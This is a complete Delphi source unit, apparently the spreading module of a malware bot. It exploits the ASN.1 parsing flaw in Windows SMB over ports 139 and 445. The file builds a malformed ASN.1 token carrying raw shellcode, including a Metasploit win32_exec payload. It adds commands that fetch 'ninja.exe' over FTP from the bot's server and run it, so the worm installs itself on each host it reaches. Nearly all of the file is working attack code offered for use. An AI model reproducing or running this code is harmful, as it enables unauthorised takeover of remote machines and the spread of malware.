unit asn1_spreader;

interface

uses
  Windows,
  Winsock,
  untFTPD,
  untFunctions;

type
  TBitString = Class(TObject)
  Public
    Procedure BitString; overload;
    Procedure BitString(const szString: pChar); overload;
    Function BitString( pData: Pointer; nDataLen: Integer): TBitString; overload;
    Procedure BitString( pPre: Pointer; nPreLen: Integer;  pData: Pointer; const nDataLen: Integer); overload;

    Procedure Free;

    Function ASN1: Boolean;
    Function Bits: Boolean;
    Function Append(pData: Pointer; nDataLen: Integer): Boolean; overload;
    Function Append(szString: pChar): Boolean; overload;
    Function Append(BitString: TBitString): Boolean; overload;
    Function Constr: Boolean; overload;
    Function Constr(BitString: TBitString): Boolean; overload;
  Private
    m_pData     :Pointer;
    m_nDataLen  :Integer;
  End;

  Function ASN1Root(szAddress: String; intPort: Integer): Boolean;

implementation

uses
  untBot;

Procedure MemSet(Var Str: String; C: String; L: Integer);
Begin
  Str := '';
  While Length(Str) < L Do
    Str := Str + C;
End;

Procedure TBitString.Free;
Begin
  m_pData := NIL;
  m_nDataLen := 0;
End;

Procedure TBitString.BitString;
Begin
  m_pData := NIL;
  m_nDataLen := 0;
End;

Procedure TBitString.BitString(const szString: Pchar);
Var
  Temp  :TBitString;
Begin
  Temp := TBitString.Create;
  Temp := BitString(szString, Length(szString));
  Self.m_pData := Temp.m_pData;
  Self.m_nDataLen := Temp.m_nDataLen;
  Temp.Free;
End;

Function TBitString.BitString(pData: Pointer; nDataLen: Integer): TBitString;
Var
  pBuffer       :Array Of Char;
Begin
  Result := NIL;
  SetLength(pBuffer, nDataLen);
  Move(pData, pBuffer[0], nDataLen);
  m_nDataLen := nDataLen;
  m_pData := (pBuffer);
  Result := TBitString.Create;
  Result.m_pData := m_pData;
  Result.m_nDataLen := m_nDataLen;
End;

Procedure TBitString.BitString( pPre: Pointer; nPreLen: Integer; pData: Pointer; const nDataLen: Integer);
Var
  pBuffer       :Array Of Char;
Begin
  SetLength(pBuffer, nPreLen+nDataLen);
  Move(pPre, pBuffer[0], nPreLen);
  Move(pData, pBuffer[nPreLen], nDataLen);
  m_nDataLen := nPreLen + nDataLen;
  m_pData := (pBuffer);
End;

Function TBitString.ASN1: Boolean;
Var
  nNumStrLen    :Integer;
  pNewData      :Array Of Byte;
Begin
  Result := False;

  If m_nDataLen >= $ffff Then
    Exit;

  If m_nDataLen < $7f Then
    nNumStrLen := 1
  Else
    nNumStrLen := 3;

  SetLength(pNewData, m_nDataLen + nNumStrLen);

  If nNumStrLen = 1 Then
  Begin
    pNewData[0] := m_nDataLen;
    Move(m_pData, pNewData[1], m_nDataLen);
  End Else
  Begin
    pNewData[0] := $82;
    pNewData[1] := (m_nDataLen shr 8);
    pNewData[2] := (m_nDataLen and $ff);
    Move(m_pData, pNewData[3], m_nDataLen);
  End;

  m_nDataLen := nNumStrLen + m_nDataLen;
  m_pData := (pNewData);

  Result := True;
End;

Function TBitString.Bits: Boolean;
Var
  pNewData      :Array Of Byte;
  StrTemp       :TBitString;
Begin
  StrTemp := TBitString.Create;
  StrTemp.BitString(pchar(#$00), 1, m_pData, m_nDataLen);
  StrTemp.ASN1;

  SetLength(pNewData, StrTemp.m_nDataLen + 1);
  FillChar(pNewData[0], StrTemp.m_nDataLen, 0);

  pNewData[0] := $03;
  Move(StrTemp.m_pData, pNewData[1], StrTemp.m_nDataLen);

  Free;

  m_nDataLen := StrTemp.m_nDataLen + 1;
  m_pData := (pNewData);

  StrTemp.Free;
  Result := True;
End;

Function TBitString.Append(pData: Pointer; nDataLen: Integer): Boolean;
Var
  Temp          :TBitString;
Begin
  Temp := TBitString.Create;
  Temp.BitString(m_pData, m_nDataLen, pData, nDataLen);
//  Self := Temp;
  Self.m_pData := pointer(dword(Self.m_pData) + dword(Temp.m_pData));
  Self.m_nDataLen := Self.m_nDataLen + Temp.m_nDataLen;
  Result := True;
End;

Function TBitString.Append(szString: PChar): Boolean;
Begin
  Result := Append(szString, Length(szString));
End;

Function TBitString.Append(BitString: TBitString): Boolean;
Begin
  Result := Append(BitString.m_pData, BitString.m_nDataLen);
End;

Function TBitString.Constr: Boolean;
Var
  StrTemp2      :TBitString;
Begin
  Result := False;
  If Not ASN1 Then
    Exit;

  StrTemp2 := TBitString.Create;
  StrTemp2.BitString(pchar(#$23), 1, m_pData, m_nDataLen);
  Free;

  Self.m_pData := StrTemp2.m_pData;
  Self.m_nDataLen := StrTemp2.m_nDataLen;

  Result := True;
End;

Function TBitString.Constr(BitString: TBitString): Boolean;
Begin
  Result := False;
  If Not Append(BitString) Then
    Exit;

  Result := Constr;
End;

Function Token(pStage0: Pointer; nStage0Len: Integer; pStage1: Pointer; nStage1Len: Integer): TBitString;
Var
  Token,
  Temp_Constr_FWBK,
  Temp_Bits_TagStage1,
  Temp_Constr_Unknown,
  Temp_Bits_PEBlockStage0,
  Temp_Constr_PEBlockStage0_Unknown,
  Temp_Constr_PEBlockStage0_Unknown_FWBK_TagStage1,
  CompleteBitString,
  Temp_Token1,
  Temp_Token2,
  Bits_Unknown2 :TBitString;
  szRand        :String;
  Tag           :String;
  Fw            :String;
  Bk            :String;
  PEBlock       :String;
Begin
  Tag := #$90#$42#$90#$42#$90#$42#$90#$42;
  Fw  := #$f8#$0f#$01#$00;
  Bk  := #$f8#$0f#$01;
  PEBlock := #$20#$f0#$fd#$7f;

  Token := TBitString.Create;
  Temp_Constr_FWBK := TBitString.Create;
  Temp_Bits_TagStage1 := TBitString.Create;
  Temp_Constr_Unknown := TBitString.Create;
  Temp_Bits_PEBlockStage0 := TBitString.Create;
  Temp_Constr_PEBlockStage0_Unknown := TBitString.Create;
  Temp_Constr_PEBlockStage0_Unknown_FWBK_TagStage1 := TBitString.Create;
  CompleteBitString := TBitString.Create;
  Temp_Token1 := TBitString.Create;
  Temp_Token2 := TBitString.Create;
  Bits_Unknown2 := TBitString.Create;

  Result := Token;
  If (nStage0Len > 1032) Or ((SizeOf(Tag)-1+nStage1Len) > 1032) Then
    Exit;

  Temp_Constr_FWBK.Append(pchar(fw), Length(fw));
  Temp_Constr_FWBK.Append(pchar(bk), Length(Bk));
  Temp_Constr_FWBK.Bits;
  Temp_Constr_FWBK.Constr;

  MemSet(szRand, 'B', 2048);
  Temp_Bits_TagStage1.Append(pchar(Tag), Length(Tag));
  Temp_Bits_TagStage1.Append(pchar(pStage1), nStage1Len);
  Temp_Bits_TagStage1.Append(pchar(szRand), 1033 - Temp_Bits_TagStage1.m_nDataLen);
  Temp_Bits_TagStage1.Bits;

  Temp_Constr_Unknown.Append(#$eb#$06#$90#$90#$90#$90#$90#$90);
  Temp_Constr_Unknown.Bits;
  MemSet(szRand, 'D', 2048);
  Bits_Unknown2.BitString(pchar(szRand), 1040);
  Bits_Unknown2.Bits;
  Temp_Constr_Unknown.Constr(Bits_Unknown2);
  Bits_Unknown2.Free;

  memset(szRand, 'C', 2048);
  Temp_Bits_PEBlockStage0.Append('CCCC');
  Temp_Bits_PEBlockStage0.Append(pchar(peblock), length(peblock));
  Temp_Bits_PEBlockStage0.Append(pchar(pStage0), nStage0Len);
  Temp_Bits_PEBlockStage0.Append(pchar(szRand), 1032-nStage0len);
  Temp_Bits_PEBlockStage0.Bits;

  Temp_Constr_PEBlockStage0_Unknown.Append(Temp_Bits_PEBlockStage0);
  Temp_Constr_PEBlockStage0_Unknown.Append(Temp_Constr_Unknown);
  Temp_Constr_PEBlockStage0_Unknown.Constr;
  Temp_Bits_PEBlockStage0.Free;
  Temp_Constr_Unknown.Free;

  Temp_Constr_PEBlockStage0_Unknown_FWBK_TagStage1.Append(Temp_Bits_TagStage1);
  Temp_Constr_PEBlockStage0_Unknown_FWBK_TagStage1.Append(Temp_Constr_FWBK);
  Temp_Constr_PEBlockStage0_Unknown_FWBK_TagStage1.Append(Temp_Constr_PEBlockStage0_Unknown);
  Temp_Constr_PEBlockStage0_Unknown_FWBK_TagStage1.Constr;
  Temp_Bits_TagStage1.Free;
  Temp_Constr_FWBK.Free;
  Temp_Constr_PEBlockStage0_Unknown.Free;

  Memset(szRand, 'A', 2048);
  CompleteBitString.Append(pchar(szRand), 1024);
  CompleteBitString.Bits;
  CompleteBitString.Append(pchar(#$03#$00), 2);
  CompleteBitString.Append(Temp_Constr_PEBlockStage0_Unknown_FWBK_TagStage1);
  CompleteBitString.Constr;
  Temp_Constr_PEBlockStage0_Unknown_FWBK_TagStage1.Free;

  Temp_Token1.Append(CompleteBitString);
  Temp_Token1.ASN1;
  CompleteBitString.Free;

  Temp_Token2.Append(#$a1);
  Temp_Token2.Append(Temp_Token1);
  Temp_Token2.ASN1;
  Temp_Token1.Free;

  Temp_Token1.Append(#$30);
  Temp_Token1.Append(Temp_Token2);
  Temp_Token1.ASN1;
  Temp_Token2.Free;

  Temp_Token2.Append(#$06#$06#$2b#$06#$01#$05#$05#$02#$a0);
  Temp_Token2.Append(Temp_Token1);
  Temp_Token2.ASN1;
  Temp_Token1.Free;

  Token.Append(#$60);
  Token.Append(Temp_Token2);
  Temp_Token2.Free;

  Result := Token;
End;

Function MyRecv(nFDSocket: TSocket; Var pBuffer; nLen: Integer; nFlags: Integer): Integer;
Var
  ReadFDSet     :TFDSet;
  ExceptFDSet   :TFDSet;
  TimeOut       :TTimeVal;
Begin
  Result := -1;

  FD_ZERO(ReadFDSet);
  FD_ZERO(ExceptFDSet);
  FD_SET(nFDSocket, ReadFDSet);
  FD_SET(nFDSocket, ExceptFDSet);

  TimeOut.tv_sec := 10;
  TimeOut.tv_usec := 0;

  If Select(nFDSocket + 1, @ReadFDSet, NIL, @ExceptFDSet, @TimeOut) <> 1 Then
    Exit;

  If Not FD_ISSet(nFDSocket, ReadFDSet) Then
    Exit;

  Result := Recv(nFDSocket, pBuffer, nLen, nFlags);
End;

Function SendSMB(nFDSocket: TSocket; Var pData; nLen: Integer): Boolean;
Var
  nNetNum       :Integer;
  S             :String;
Begin
  Result := False;
  nNetNum := hTonl(nLen);
  If Send(nFDSocket, nNetNum, SizeOf(nNetNum), 0) <> SizeOf(nNetNum) Then
    Exit;
  SetLength(s, nLen);
  Move(pData, S[1], nLen);
  Result := Send(nFDSocket, pData, nLen, 0) = nLen;
End;

Function ExploitSMB(nFDSocket: TSocket; BitToken: TBitString): Boolean;
Const
	SMB_Negotiate: String =
	#$ff#$53#$4d#$42+		// protocol id
	#$72+					// command (NEGOTIATE_MESSAGE)
	#$00#$00#$00#$00+		// status
	#$18+					// flags (pathnames are case-insensitive)
	#$53#$C8+				// flags2 (support Unicode, NT error codes, long
	// filenames, extended security negotiation and
	// extended attributes)
	#$00#$00+				// Process ID high word
	#$00#$00#$00#$00+		// signature
	#$00#$00#$00#$00+
	#$00#$00+				// reserved
	#$00#$00+				// Tree ID
	#$37#$13+				// Process ID
	#$00#$00+				// User ID
	#$00#$00+				// Multiplex ID
	// SMB Message Parameters
	#$00+					// word count
	// SMB Message Data
	#$62#$00+				// byte count
	#$02#$50#$43#$20#$4E#$45#$54#$57#$4F#$52#$4B#$20#$50#$52#$4F#$47+
	#$52#$41#$4D#$20#$31#$2E#$30#$00+									// PC NETWORK PROGRAM 1.0
	#$02#$4C#$41#$4E#$4D#$41#$4E#$31#$2E#$30#$00+						// LANMAN1.0
	#$02#$57#$69#$6e#$64#$6f#$77#$73#$20#$66#$6f#$72#$20#$57#$6f#$72+
	#$6b#$67#$72#$6f#$75#$70#$73#$20#$33#$2e#$31#$61#$00+				// WfW 3.1a
	#$02#$4C#$4D#$31#$2E#$32#$58#$30#$30#$32#$00+						// LM1.2X002
	#$02#$4C#$41#$4E#$4D#$41#$4E#$32#$2E#$31#$00+						// LANMAN2.1
	#$02#$4E#$54#$20#$4C#$4D#$20#$30#$2E#$31#$32#$00;					// NT LM 0.12
	SMB_SessionSetup1: String =
	// SMB Message Header
	#$ff#$53#$4d#$42+		// protocol id
	#$73+					// command (Session Setup AndX)
	#$00#$00#$00#$00+		// status
	#$18+					// flags (pathnames are case-insensitive)
	#$07#$C8+				// flags2 (support Unicode, NT error codes, long
	// filenames, extended security negotiation and
	// extended attributes and security signatures)
	#$00#$00+				// Process ID high word
	#$00#$00#$00#$00+		// signature
	#$00#$00#$00#$00+
	#$00#$00+				// reserved
	#$00#$00+				// Tree ID
	#$37#$13+				// Process ID
	#$00#$00+				// User ID
	#$00#$00+				// Multiplex ID
	// SMB Message Parameters
	#$0c+					// word count (12 words)
	#$ff+					// AndXCommand: No further commands
	#$00+					// reserved
	#$00#$00+				// AndXOffset
	#$04#$11+				// max buffer: 4356
	#$0a#$00+				// max mpx count: 10
	#$00#$00+				// VC number
	#$00#$00#$00#$00;		// session key
	SMB_SessionSetup2: String =
	#$00#$00#$00#$00+		// reserved
	#$d4#$00#$00#$80;		// capabilities
	SMB_SessionSetup3: String =
	#$00#$00#$00#$00#$00#$00;
Var
  nSMBSize              :Integer;
  nPos                  :Integer;

  pSMBPacket            :Array Of Byte;
  szRecvBuffer          :Array[0..255] of Char;
  Temp                  :String;
Begin
  Result := False;

  nSMBSize := Length(SMB_SessionSetup1) + 2 +
              Length(SMB_SessionSetup2) + 2 +
              BitToken.m_nDataLen +
              Length(SMB_SessionSetup3);
  SetLength(pSMBPacket, nSMBSize);
  nPos := 0;

  Move(SMB_SessionSetup1[1], pSMBPacket[0], Length(SMB_SessionSetup1));
  Inc(nPos, Length(SMB_SessionSetup1));

  pSMBPacket[nPos] := BitToken.m_nDataLen;
  Inc(nPos, 2);

  Move(SMB_SessionSetup2[1], pSMBPacket[nPos], Length(SMB_SessionSetup2));
  Inc(nPos, Length(SMB_SessionSetup2));

  pSMBPacket[nPos] := BitToken.m_nDataLen;
  Inc(nPos, 2);

  Move(BitToken.m_pData, pSMBPacket[nPos], BitToken.m_nDataLen);
  Inc(nPos, BitToken.m_nDataLen);

  Move(SMB_SessionSetup3[1], pSMBPacket[nPos], Length(SMB_SessionSetup3));

  Temp := SMB_Negotiate;
  If Not SendSMB(nFDSocket, Temp[1], Length(SMB_Negotiate)) Then
    Exit;

  MyRecv(nFDSocket, szRecvBuffer, SizeOf(szRecvBuffer), 0);

  If Not SendSMB(nFDSocket, pSMBPacket[0], nSMBSize) Then
    Exit;

  MyRecv(nFDSocket, szRecvBuffer, SizeOf(szRecvBuffer), 0);

  Result := True;
End;

Function ExploitSMBNT(nFDSocket: TSocket; BitToken: TBitString): Boolean;
Const
  SessionRequest: String =
  #$81#$00#$00#$44#$20#$43#$4b#$46#$44#$45#$4e#$45#$43#$46#$44#$45+
  #$46#$46#$43#$46#$47#$45#$46#$46#$43#$43#$41#$43#$41#$43#$41#$43+
  #$41#$43#$41#$43#$41#$00#$20#$43#$41#$43#$41#$43#$41#$43#$41#$43+
  #$41#$43#$41#$43#$41#$43#$41#$43#$41#$43#$41#$43#$41#$43#$41#$43+
  #$41#$43#$41#$43#$41#$41#$41#$00;
Var
  szBuffer      :Array[0..32] Of Char;
  Temp          :String;
Begin
  Result := False;
  Temp := SessionRequest;
  If Send(nFDSocket, Temp[1], Length(SessionRequest), 0) <> Length(SessionRequest) Then
    Exit;

  If MyRecv(nFDSocket, szBuffer, SizeOf(szBuffer), 0) = SOCKET_ERROR Then
    Exit;

  If szBuffer[0] <> #$82 Then
    Exit;

  Result := ExploitSMB(nFDSocket, BitToken);
End;

(*
bool ExploitHTTP( SOCKET nFDSocket, BitString BitToken, std::string sHost )
{
	static const char szReq[] =
	"GET / HTTP/1.0\r\n"
	"Host: %s\r\n"
	"Authorization: Negotiate %s\r\n"
	"\r\n";

	// encode to Base64
	std::string sBase64Token = EncodeBase64( (char* )BitToken.m_pData, BitToken.m_nDataLen, "" );

	// make request
	int nReqSize =
		sizeof( szReq ) - 2 - 2 + 
		sHost.length() + 
		sBase64Token.length();
	char *pszReqFormated = (char* )malloc( nReqSize );
	if( !pszReqFormated )
		return false;
	// ---
	_snprintf( pszReqFormated, nReqSize, szReq, sHost.c_str(), sBase64Token.c_str() );

	// send request
	if( fsend( nFDSocket, pszReqFormated, nReqSize, 0 ) != nReqSize )
	{
		free( pszReqFormated );
		return false;
	}
	free( pszReqFormated );

	return true;
}
*)

Function ASN1Root(szAddress: String; intPort: Integer): Boolean;
Const
	Stage0: String =
	#$53#$56#$57#$66#$81#$ec#$80#$00#$89#$e6#$e8#$ed#$00#$00#$00#$ff+
	#$36#$68#$09#$12#$d6#$63#$e8#$f7#$00#$00#$00#$89#$46#$08#$e8#$a2+
	#$00#$00#$00#$ff#$76#$04#$68#$6b#$d0#$2b#$ca#$e8#$e2#$00#$00#$00+
	#$89#$46#$0c#$e8#$3f#$00#$00#$00#$ff#$76#$04#$68#$fa#$97#$02#$4c+
	#$e8#$cd#$00#$00#$00#$31#$db#$68#$10#$04#$00#$00#$53#$ff#$d0#$89+
	#$c3#$56#$8b#$76#$10#$89#$c7#$b9#$10#$04#$00#$00#$f3#$a4#$5e#$31+
	#$c0#$50#$50#$50#$53#$50#$50#$ff#$56#$0c#$8b#$46#$08#$66#$81#$c4+
	#$80#$00#$5f#$5e#$5b#$ff#$e0#$60#$e8#$23#$00#$00#$00#$8b#$44#$24+
	#$0c#$8d#$58#$7c#$83#$43#$3c#$05#$81#$43#$28#$00#$10#$00#$00#$81+
	#$63#$28#$00#$f0#$ff#$ff#$8b#$04#$24#$83#$c4#$14#$50#$31#$c0#$c3+
	#$31#$d2#$64#$ff#$32#$64#$89#$22#$31#$db#$b8#$90#$42#$90#$42#$31+
	#$c9#$b1#$02#$89#$df#$f3#$af#$74#$03#$43#$eb#$f3#$89#$7e#$10#$64+
	#$8f#$02#$58#$61#$c3#$60#$bf#$20#$f0#$fd#$7f#$8b#$1f#$8b#$46#$08+
	#$89#$07#$8b#$7f#$f8#$81#$c7#$78#$01#$00#$00#$89#$f9#$39#$19#$74+
	#$04#$8b#$09#$eb#$f8#$89#$fa#$39#$5a#$04#$74#$05#$8b#$52#$04#$eb+
	#$f6#$89#$11#$89#$4a#$04#$c6#$43#$fd#$01#$61#$c3#$a1#$0c#$f0#$fd+
	#$7f#$8b#$40#$1c#$8b#$58#$08#$89#$1e#$8b#$00#$8b#$40#$08#$89#$46+
	#$04#$c3#$60#$8b#$6c#$24#$28#$8b#$45#$3c#$8b#$54#$05#$78#$01#$ea+
	#$8b#$4a#$18#$8b#$5a#$20#$01#$eb#$e3#$38#$49#$8b#$34#$8b#$01#$ee+
	#$31#$ff#$31#$c0#$fc#$ac#$38#$e0#$74#$07#$c1#$cf#$0d#$01#$c7#$eb+
	#$f4#$3b#$7c#$24#$24#$75#$e1#$8b#$5a#$24#$01#$eb#$66#$8b#$0c#$4b+
	#$8b#$5a#$1c#$01#$eb#$8b#$04#$8b#$01#$e8#$89#$44#$24#$1c#$61#$c2+
	#$08#$00#$eb#$fe;

	// win32_exec -  EXITFUNC=thread Size=138 Encoder=None http://metasploit.com
	MetasploitShellCode: String =
	#$81#$c4#$54#$f2#$ff#$ff+ //add esp, -3500
	#$fc#$e8#$46#$00#$00#$00#$8b#$45#$3c#$8b#$7c#$05#$78#$01#$ef#$8b+
	#$4f#$18#$8b#$5f#$20#$01#$eb#$e3#$2e#$49#$8b#$34#$8b#$01#$ee#$31+
	#$c0#$99#$ac#$84#$c0#$74#$07#$c1#$ca#$0d#$01#$c2#$eb#$f4#$3b#$54+
	#$24#$04#$75#$e3#$8b#$5f#$24#$01#$eb#$66#$8b#$0c#$4b#$8b#$5f#$1c+
	#$01#$eb#$8b#$1c#$8b#$01#$eb#$89#$5c#$24#$04#$c3#$31#$c0#$64#$8b+
	#$40#$30#$85#$c0#$78#$0f#$8b#$40#$0c#$8b#$70#$1c#$ad#$8b#$68#$08+
	#$e9#$0b#$00#$00#$00#$8b#$40#$34#$05#$7c#$00#$00#$00#$8b#$68#$3c+
	#$5f#$31#$f6#$60#$56#$eb#$0d#$68#$ef#$ce#$e0#$60#$68#$98#$fe#$8a+
	#$0e#$57#$ff#$e7#$e8#$ee#$ff#$ff#$ff;

Var
  ShellBuff     :Array[0..1024] Of Char;
  nCmdLen       :Integer;
  nShellBuffSize:Integer;
  BitToken      :TBitString;
  nCount        :Integer;
  bOK           :Boolean;
  nFDSocket     :TSocket;
  SockAddr      :TSockAddrIn;
  WSA           :TWSAData;
  Temp          :String;
Begin
  Result := False;

  FillChar(ShellBuff, 1024, #0);
  Move(MetaSploitShellCode[1], ShellBuff[0], Length(MetaSploitShellCode));

  Temp := 'echo open ' + ftp_mainip + ' ' + inttostr(ftp_port) + ' > n.txt'#10 +
              'echo user ' + ftp_user + ' ' + ftp_pass + ' >> n.txt'#10 +
              'echo binary >> n.txt'#10 +
              'echo get ninja.exe >> n.txt'#10 +
              'echo quit >> n.txt'#10 +
              'ftp.exe -n -s:n.txt'#10 +
              'ninja.exe'#10;

  nCmdLen := Length(Temp);
  Move(Temp[1], ShellBuff[Length(MetasploitShellCode)], nCmdLen);
  nShellBuffSize := length(MetasploitShellCode) + nCMDLen + 1;

  BitToken := TbitString.Create;
  BitToken.BitString;
  BitToken := Token(@Stage0[1], Length(Stage0), @ShellBuff[1], nShellBuffSize);
  If BitToken.m_nDataLen = 0 Then Exit;

  nCount := 0;
  bOK := False;

  While (nCount < 2) And (Not bOK) Do
  Begin
    WSAStartUP($101, WSA);
    nFDSocket := Socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    If nFDSocket <> SOCKET_ERROR Then
    Begin
      SockAddr.sin_family := AF_INET;
      SockAddr.sin_port := hTons(intPort);
      SockAddr.sin_addr.S_addr := inet_addr(pChar(szAddress));
      If Connect(nFDSocket, SockAddr, SizeOf(SockAddr)) = 0 Then
      Begin
        If intPort = 139  Then bOk := ExploitSMBNT(nFDSocket, BitToken);
        If intPort = 445  Then bOk := ExploitSMB(nFDSocket, BitToken);
        If intPort = 3284 Then bOk := ExploitSMB(nFDSocket, BitToken);
        CloseSocket(nFDSocket);
      End;
    End;
    WSACleanUP();

    If Not bOK Then
      Sleep(1000)
    Else
      Break;
    Inc(nCount);
  End;
  BitToken.Free;

  Result := bOk;
End;

end.

